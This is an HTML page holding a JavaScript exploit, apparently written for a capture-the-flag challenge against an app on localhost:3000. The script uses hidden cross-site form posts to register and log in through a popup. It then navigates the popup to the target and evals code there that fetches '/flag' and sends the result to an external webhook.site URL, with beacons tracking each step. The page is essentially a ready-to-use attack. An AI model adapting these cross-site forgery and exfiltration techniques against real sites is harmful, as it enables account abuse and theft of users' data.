<!DOCTYPE html>
<html>
<body>
<script>
new Image().src = 'https://webhook.site/showontest?step=0_start';

var p = window.open("about:blank", "popup");

/* 1. register */
new Image().src = 'https://webhook.site/showontest?step=1_register';
let f1 = document.createElement("form");
f1.method = "POST";
f1.action = "http://localhost:3000/register";
f1.target = "popup";
f1.innerHTML = '<input name="username" value="poptest6"><input name="password" value="poptest6">';
document.body.appendChild(f1);
f1.submit();

/* 2. login */
setTimeout(() => {
  new Image().src = 'https://webhook.site/showontest?step=2_login';
  let f2 = document.createElement("form");
  f2.method = "POST";
  f2.action = "http://localhost:3000/login";
  f2.target = "popup";
  f2.innerHTML = '<input name="username" value="poptest6"><input name="password" value="poptest6">';
  document.body.appendChild(f2);
  f2.submit();
}, 150);

/* 3. same-origin HTML 확보 */
setTimeout(() => {
  new Image().src = 'https://webhook.site/showontest?step=3_localhost';
  p.location = "http://localhost:3000/";
}, 350);

/* 4. popup에서 eval로 fetch 실행 */
setTimeout(() => {
  new Image().src = 'https://webhook.site/showontest?step=4_eval';
  try {
    p.eval("fetch('/flag').then(function(r){return r.text();}).then(function(f){new Image().src='https://webhook.site/showontest?flag='+encodeURIComponent(f);}).catch(function(e){new Image().src='https://webhook.site/showontest?fetcherr='+encodeURIComponent(e.message);});");
    new Image().src = 'https://webhook.site/showontest?step=4b_eval_done';
  } catch(e) {
    new Image().src = 'https://webhook.site/showontest?evalerr=' + encodeURIComponent(e.message);
  }
}, 550);
</script>
</body>
</html>